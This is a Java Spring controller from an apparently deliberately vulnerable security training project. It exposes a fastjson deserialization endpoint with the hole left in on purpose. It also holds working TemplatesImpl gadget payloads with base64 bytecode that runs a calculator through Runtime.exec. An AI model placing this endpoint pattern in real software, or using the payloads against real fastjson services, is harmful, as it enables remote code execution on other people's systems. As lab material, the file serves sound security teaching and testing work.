package com.madaha.codesecone.controller.AdvancedAttack.deserialize.components;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@RequestMapping("/fastjson")
public class FastJson {

    @RequestMapping(value = "/deSerializeVul", method = {RequestMethod.POST})
    @ResponseBody
    public String deSerializeVul(@RequestBody String params){
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转为json
            JSONObject ob = JSON.parseObject(params);
            return ob.get("name").toString();
        } catch (Exception e){
            return e.toString();
        }
    }

    public static void main(String[] args){

        // Open calc in mac
//        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\"], \"_name\": \"lightless\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
//        JSON.parseObject(payload, Feature.SupportNonPublicField);

        // Open calc in windows
        String payload = "{\n" +
                "\"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "\"_bytecodes\": [\"yv66vgAAADQAHwoABwASCgATABQIABUKABMAFgcAFwoABQASBwAYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHABkBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAClNvdXJjZUZpbGUBABpUZW1wbGF0ZXNJbXBsX0V4cGxvaXQuamF2YQwACAAJBwAaDAAbABwBAARjYWxjDAAdAB4BABVUZW1wbGF0ZXNJbXBsX0V4cGxvaXQBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAIAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAFAAQABgANAAcADAAAAAQAAQANAAkADgAPAAIACgAAACUAAgABAAAACbsABVm3AAZXsQAAAAEACwAAAAoAAgAAAAoACAALAAwAAAAEAAEADQABABAAAAACABE=\"],\n" +
                "'_name': 'madaha',\n" +
                "'_tfactory': {},\n" +
                "\"_outputProperties\": {},\n" +
                "}";
        JSON.parseObject(payload, Feature.SupportNonPublicField);

        String PoC = "{\"xxx\":{\n" +
                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "    \"_bytecodes\": [\"yv66vgAAADQAHwoABwASCgATABQIABUKABMAFgcAFwoABQASBwAYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHABkBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAClNvdXJjZUZpbGUBABpUZW1wbGF0ZXNJbXBsX0V4cGxvaXQuamF2YQwACAAJBwAaDAAbABwBAARjYWxjDAAdAB4BABVUZW1wbGF0ZXNJbXBsX0V4cGxvaXQBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAIAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAFAAQABgANAAcADAAAAAQAAQANAAkADgAPAAIACgAAACUAAgABAAAACbsABVm3AAZXsQAAAAEACwAAAAoAAgAAAAoACAALAAwAAAAEAAEADQABABAAAAACABE=\"],\n" +
                "    '_name': 'madaha',\n" +
                "    '_tfactory': {},\n" +
                "    \"_outputProperties\": {},\n" +
                "}}";
//        JSON.parse(PoC);
    }
}


/**

yv66vgAAADQAHwoABwASCgATABQIABUKABMAFgcAFwoABQASBwAYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHABkBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAClNvdXJjZUZpbGUBABpUZW1wbGF0ZXNJbXBsX0V4cGxvaXQuamF2YQwACAAJBwAaDAAbABwBAARjYWxjDAAdAB4BABVUZW1wbGF0ZXNJbXBsX0V4cGxvaXQBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAIAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAFAAQABgANAAcADAAAAAQAAQANAAkADgAPAAIACgAAACUAAgABAAAACbsABVm3AAZXsQAAAAEACwAAAAoAAgAAAAoACAALAAwAAAAEAAEADQABABAAAAACABE=

{
"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
"_bytecodes": ["yv66vgAAADQAHwoABwASCgATABQIABUKABMAFgcAFwoABQASBwAYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHABkBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAClNvdXJjZUZpbGUBABpUZW1wbGF0ZXNJbXBsX0V4cGxvaXQuamF2YQwACAAJBwAaDAAbABwBAARjYWxjDAAdAB4BABVUZW1wbGF0ZXNJbXBsX0V4cGxvaXQBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAIAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAFAAQABgANAAcADAAAAAQAAQANAAkADgAPAAIACgAAACUAAgABAAAACbsABVm3AAZXsQAAAAEACwAAAAoAAgAAAAoACAALAAwAAAAEAAEADQABABAAAAACABE="],
'_name': 'madaha',
'_tfactory': {},
"_outputProperties": {},
}

*/